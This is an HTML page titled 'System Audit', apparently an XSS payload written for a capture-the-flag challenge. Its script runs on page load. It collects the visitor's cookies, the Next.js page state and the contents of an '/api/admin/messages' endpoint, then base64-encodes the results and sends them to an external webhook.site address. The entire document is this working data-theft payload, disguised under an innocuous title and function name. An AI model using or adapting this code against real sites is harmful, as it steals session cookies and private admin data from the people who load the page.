<!DOCTYPE html>
<html>
<head><title>System Audit</title></head>
<body>
    <script>
        const webhook = 'https://webhook.site/645df2ce-54f8-48f5-bb51-3d8a9076cc40';

        async function deepScan() {
            let results = {};

            // 1. Grab Next.js Internal State (Common for Flags in React apps)
            try {
                results.nextData = window.__NEXT_DATA__ || "Not Found";
            } catch(e) {}

            // 2. Grab Cookies
            results.cookies = document.cookie;

            // 3. Fetch the actual Inbox API (Targeting the list, not an ID)
            try {
                const response = await fetch('/api/admin/messages');
                results.apiInbox = await response.text();
            } catch(e) { results.apiError = e.message; }

            // Exfiltrate everything
            fetch(webhook, {
                method: 'POST',
                mode: 'no-cors',
                body: btoa(JSON.stringify(results))
            });
        }

        deepScan();
    </script>
</body>
</html>
